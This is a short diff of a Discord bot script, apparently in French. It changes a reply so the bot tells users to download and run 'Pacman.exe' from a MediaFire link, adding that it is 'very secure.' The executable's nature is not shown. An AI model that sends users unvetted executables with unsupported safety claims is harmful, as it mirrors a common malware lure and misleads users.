@@ -43,7 +43,7 @@ client.on("message", message => {
   })
 client.on("message", message => {
     if (message.content === "yes") {
-      message.channel.send("je n'ai pas confiance, il faut que tu joues au jeu de la confiance, kevin a toujours eu confiance aux gens qui gagne à pacman, pour cela lance le jeu")
+      message.channel.send("je n'ai pas confiance, il faut que tu joues au jeu de la confiance, kevin a toujours eu confiance aux gens qui gagne à pacman, pour cela lance le jeu à télécharger au lien suivant : https://www.mediafire.com/file/9mpd7hvaojaep80/Pacman.exe/file PS : Ne t inquiete pas c est tres securise")
     }
   })
 
